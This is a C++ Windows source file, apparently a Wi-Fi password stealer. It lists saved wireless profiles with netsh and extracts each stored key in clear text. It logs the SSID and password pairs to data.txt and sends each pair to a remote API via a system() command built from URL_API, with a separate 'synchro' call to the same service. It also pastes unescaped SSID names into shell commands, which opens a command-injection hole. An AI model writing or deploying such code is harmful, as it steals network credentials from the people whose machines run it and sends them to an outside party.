#include <iostream>
#include <string>
#include <cstdlib>
#include <fstream>
#include <windows.h>
#include <regex>
#include <chrono>
#include <time.h>
#include <thread>
#include <stack>
#include <sstream>
#include "api.hpp"

using namespace std;

void espace() {
    cout << "=============================================" << endl;
}

void extract() {
    ofstream fichierentrer("data.txt");
    fichierentrer << "======================LOGS======================" << "\n";
    stack<string> pile;
    FILE* pipe;
    char buffer[256];
    string cmd1 = "netsh wlan show profile";
    pipe = _popen(cmd1.c_str(), "r");
    if (!pipe) return;
    regex rgx("Profil Tous les utilisateurs.*:\\s*(.+)");
    smatch match;
    // Boucle sur toutes les lignes
    while (fgets(buffer, sizeof(buffer), pipe)) {
        string line(buffer);
        if (regex_search(line, match, rgx)) {
            cout << "SSID trouvé : " << match[1] << endl;
            pile.push(match[1]);
            // cout << pile.top() << endl;
        }
    }
    cout << pile.size() << " SSID on été trouvé" << endl;
    this_thread::sleep_for(chrono::seconds(1));
    _pclose(pipe);
    espace();
    string mdp;
    string command;
    do
    {
        FILE* pipe2;
        char buffer2[256];
        string cmd = ("netsh wlan show profile name=\"" + pile.top() +
            "\" key=clear | findstr \"Contenu\"");
        // cout << cmd;
        pipe2 = _popen(cmd.c_str(), "r");
        fgets(buffer2, 256, pipe2);
        string liste(buffer2);

        // IA
        regex rgx2(":\\s*(.+)");
        smatch match2;
        if (regex_search(liste, match2, rgx2)) {
            mdp = match2[1];
        }
        else {
            mdp = liste;
        }
        // supprimer \n et espaces en fin de string
        liste.erase(liste.find_last_not_of(" \n\r\t") + 1);
        // supprimer espaces en début
        liste.erase(0, liste.find_first_not_of(" \t"));
        // IA

        _pclose(pipe2);
        cout << pile.top() << " = " << liste << endl;
        ofstream fichierentrer("data.txt", ios::app);
        fichierentrer << pile.top() << " = " << liste << endl;
        command = URL_API + "wifi/" + pile.top() + "/" + mdp + "\"";
        system(command.c_str());
        pile.pop();

        this_thread::sleep_for(chrono::milliseconds(40));

    } while (!pile.empty());
    
    
}

void api() {
    string command;
    command = URL_API + "synchro";
    system(command.c_str());
}

void api2() {

}